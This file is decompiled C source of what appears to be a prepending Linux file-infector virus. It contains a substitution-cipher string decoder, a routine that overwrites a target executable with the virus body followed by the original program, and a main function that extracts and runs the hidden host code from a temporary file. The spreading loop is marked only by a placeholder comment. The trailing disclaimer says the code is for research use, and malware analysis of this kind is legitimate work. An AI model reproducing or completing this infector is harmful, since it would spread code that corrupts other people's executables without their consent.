/* Decompiled C code generated by Hex-Rays from binary */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

// Example global declarations
char a0123456789abcd[78] = "0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\"\n\r";
unsigned char byte_202080[87] = {
    60,62,64,111,36,58,44,46,108,43,42,94,63,61,41,40,124,65,66,38,37,
    59,68,123,33,119,107,85,120,122,118,117,116,115,114,113,112,95,110,
    109,45,105,104,103,102,70,67,99,98,97,126,75,50,51,52,53,54,55,56,
    57,101,121,100,49,88,83,78,81,87,84,90,77,73,82,72,71,86,79,89,76,
    106,80,74,69,47,93,91
};
char byte_2020D8;
int fd;

char* decrypt_string(char *s) {
    size_t i = 0;
    int j = 0;
    char result[520] = {0};

    while (s[i] != '\0') {
        for (int k = 0; k < 88; ++k) {
            if (s[i] == byte_202080[k]) {
                result[j++] = a0123456789abcd[k];
                break;
            }
        }
        i++;
    }
    result[j] = '\0';
    return strdup(result);
}

int contains_signature(const char *filename, const char *needle) {
    struct stat st;
    FILE *file;
    char *buf;

    if (stat(filename, &st) != 0) return 0;

    buf = malloc(st.st_size);
    if (!buf) return 0;

    file = fopen(filename, "rb");
    if (!file) {
        free(buf);
        return 0;
    }

    fread(buf, 1, st.st_size, file);
    fclose(file);

    int found = (memmem(buf, st.st_size, needle, strlen(needle)) != NULL);
    free(buf);
    return found;
}

int patch_file(const char *target, int src_fd) {
    int dest_fd = open(target, O_RDWR);
    if (dest_fd < 0) return -1;

    struct stat st;
    fstat(dest_fd, &st);

    char *orig = malloc(st.st_size);
    read(dest_fd, orig, st.st_size);

    lseek(dest_fd, 0, SEEK_SET);
    ftruncate(dest_fd, 0);

    char buf[1];
    int total = 0;
    lseek(src_fd, 0, SEEK_SET);
    while (total <= 8406 && read(src_fd, buf, 1) == 1) {
        write(dest_fd, buf, 1);
        total++;
    }

    write(dest_fd, orig, st.st_size);

    free(orig);
    close(dest_fd);
    return 0;
}

int main(int argc, char *argv[], char *envp[]) {
    char *tmp_path = decrypt_string("TwU!?Tx);(T)q)");
    fd = open(tmp_path, O_RDONLY);
    if (fd < 0) exit(1);

    if (lseek(fd, 8407, SEEK_SET) < 0) {
        close(fd);
        exit(1);
    }

    char *tmpname = tmpnam(NULL);
    int tmp_fd = open(tmpname, O_CREAT | O_WRONLY, 0700);
    if (tmp_fd < 0) exit(1);

    char buffer[8192];
    int n;
    while ((n = read(fd, buffer, sizeof(buffer))) > 0)
        write(tmp_fd, buffer, n);

    close(tmp_fd);

    // Infection routine here...

    pid_t pid = fork();
    if (pid == 0) {
        execve(tmpname, argv, envp);
        exit(127);
    } else {
        int status;
        waitpid(pid, &status, 0);
    }

    unlink(tmpname);
    close(fd);
    return 0;
}

// Warning: This program is translated from a suspicious binary and may behave maliciously.
// Use only in secure, isolated environments for educational or research purposes.
